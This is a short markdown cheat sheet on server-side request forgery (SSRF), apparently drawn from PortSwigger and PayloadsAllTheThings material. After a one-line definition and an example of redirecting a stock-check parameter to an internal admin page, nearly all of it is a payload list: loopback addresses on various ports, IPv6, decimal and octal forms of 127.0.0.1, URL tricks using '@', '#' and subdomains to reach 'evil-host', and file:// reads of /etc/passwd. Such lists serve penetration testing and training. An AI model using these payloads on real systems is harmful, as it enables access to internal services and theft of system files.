 # Server-side request forgery (SSRF)

>  Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. 

## Summary
- [Server-side request forgery (SSRF)](#server-side-request-forgery-ssrf)
  - [Summary](#summary)
  - [Exploits](#exploits)
    - [Basic SSRF](#basic-ssrf)
    - [Bypass using HTTPS](#bypass-using-https)
    - [Bypass localhost with [::]](#bypass-localhost-with)
    - [Bypass with 127.0.0.1 alternative](#bypass-with-127001-alternative)
    - [Bypass with @](#bypass-with)
    - [Bypass with '#'](#bypass-with-1)
    - [Bypass by modifying the DNS naming hierarchy](#bypass-by-modifying-the-dns-naming-hierarchy)
    - [File](#file)
  - [References](#references)

## Exploits

:fire: **example :**

Body Request : 

```bash
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1
```
Modified Body Request :

```bash
stockApi=http://localhost/admin
```
Response:

```bash
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

'ADMIN PANEL'
```
### Basic SSRF

```bash
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
http://localhost:80
http://localhost:443
http://localhost:22
```
### Bypass using HTTPS

```bash
https://127.0.0.1/
https://localhost/
```
### Bypass localhost with [::]

```bash
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```
```bash
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
```

### Bypass with 127.0.0.1 alternative

```bash
http://2130706433
http://017700000001
http://127.1
http://127.0.1
```
### Bypass with @

example : 

```bash 
https://expected-host@evil-host
```
### Bypass with '#'

example : 

```bash 
https://evil-host#expected-host
```
### Bypass by modifying the DNS naming hierarchy

example : 

```bash 
https://expected-host.evil-host
```


### File

```bash
file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd
```


## References
* [Portswigger](https://portswigger.net/web-security/ssrf)
* [swisskyrepo PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)